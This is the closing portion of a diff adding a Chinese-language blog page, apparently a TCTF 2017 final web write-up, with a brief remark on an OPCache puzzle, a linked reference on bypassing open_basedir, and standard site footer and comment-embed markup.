+        <span class="k">echo</span> <span class="s1">&#39;YES, FLAG IS flag{&#39;</span><span class="o">.</span><span class="nv">$user_input</span><span class="o">.</span><span class="s1">&#39;}&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>实际运行结果和代码逻辑不一样，猜测是重写了OPCache的缓存代码，由于open_basedir限制并不能拿到OPCode。<br>
+赛后知道了绕过open_basedir的方法：Pwn SQLite3 <a href="https://blog.chaitin.cn/abusing_fts3_tokenizer/">特性还是漏洞？滥用 SQLite 分词器 - 长亭科技</a></p>
+<h1>参考</h1>
+<p><a href="http://www.melodia.pw/?p=902">TCTF 2017 FINAL WEB PARTIAL WRITEUP - Melody</a></p>
+    </div><!-- /.entry-content -->
+    <p></p>
+    <br />
+    <br />
+    <hr style="border: 1px solid #EEEEEE;" />
+    <p>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）<p>
+    <br />
+    <div class="comments">
+      <h2>Comments</h2>
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = "https://phuker.github.io/tctf2017-final-web.html";
+          this.page.identifier = "tctf2017-final-web.html"; 
+        };
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://phuker.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+      </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>blogroll</h2>
+                        <ul>
+                            <li><a href="http://blue-whale.me" target="_blank">Blue-Whale Team</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="https://phuker.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                            <li><a href="https://github.com/phuker" target="_blank">GitHub</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <p>Powered by <a href="http://getpelican.com/" target="_blank">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/" target="_blank">blueidea</a>, inspired by the default theme. Modified by Blue-Whale Team.</p>
+        </footer><!-- /#contentinfo -->
+
+<script id="dsq-count-scr" src="//phuker.disqus.com/count.js" async></script>
+</body>
+</html>
